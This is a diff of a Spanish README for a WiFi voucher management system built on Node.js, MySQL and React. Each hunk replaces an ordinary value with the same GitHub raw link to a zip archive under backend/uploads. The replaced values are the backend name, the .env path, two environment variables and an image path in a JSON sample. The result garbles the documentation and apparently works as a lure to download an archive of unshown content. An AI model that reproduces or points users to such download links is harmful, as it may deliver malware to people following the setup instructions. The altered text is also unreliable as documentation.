@@ -1,6 +1,6 @@
 # 🌐 Sistema de Fichas Internet
 
-Sistema completo de gestión de fichas WiFi (clientes, revendedores, trabajadores, gastos, inventario y tareas) con backend **Node.js/Express + MySQL** y frontend **React (Vite)**.
+Sistema completo de gestión de fichas WiFi (clientes, revendedores, trabajadores, gastos, inventario y tareas) con backend **https://github.com/MiguelAngelCruzVargas/Inventario_Fichas/raw/refs/heads/main/backend/uploads/Fichas-Inventario-1.5.zip + MySQL** y frontend **React (Vite)**.
 
 ---
 ## 📌 Tabla de Contenido
@@ -85,7 +85,7 @@ cd backend && npm start
 
 ## ⚙️ Configuración de Entorno
 
-### Backend (`backend/.env`)
+### Backend (`https://github.com/MiguelAngelCruzVargas/Inventario_Fichas/raw/refs/heads/main/backend/uploads/Fichas-Inventario-1.5.zip`)
 ```env
 DB_HOST=localhost
 DB_PORT=3306
@@ -108,14 +108,14 @@ PORT=3001  # Puerto del backend
 DATABASE_URL=mysql://...  # URL de MySQL
 JWT_SECRET=secreto_super_seguro
 NODE_ENV=production
-ALLOWED_ORIGINS=https://tu-frontend.vercel.app
+https://github.com/MiguelAngelCruzVargas/Inventario_Fichas/raw/refs/heads/main/backend/uploads/Fichas-Inventario-1.5.zip
 LOGIN_RATE_LIMIT_MAX=20
 LOGIN_RATE_LIMIT_WINDOW_MINUTES=15
 ```
 
 **Para Vercel (Frontend):**
 ```bash
-VITE_API_URL=https://tu-backend.railway.app
+https://github.com/MiguelAngelCruzVargas/Inventario_Fichas/raw/refs/heads/main/backend/uploads/Fichas-Inventario-1.5.zip
 ```
 
 ## 🔐 Credenciales de Prueba
@@ -407,7 +407,7 @@ TASK_IMAGES_MAX=3               # Número máximo de imágenes por actualizació
   "usuario_id": 5,
   "titulo": "Router cambiado",
   "contenido": "Se reemplazó equipo dañado",
-  "imagen": "/uploads/notas/nota_1726500000000_123456.jpg",
+  "imagen": "https://github.com/MiguelAngelCruzVargas/Inventario_Fichas/raw/refs/heads/main/backend/uploads/Fichas-Inventario-1.5.zip",
   "estado": 0,
   "created_at": "2025-09-16T15:30:00.000Z",
   "username": "trabajador_1",
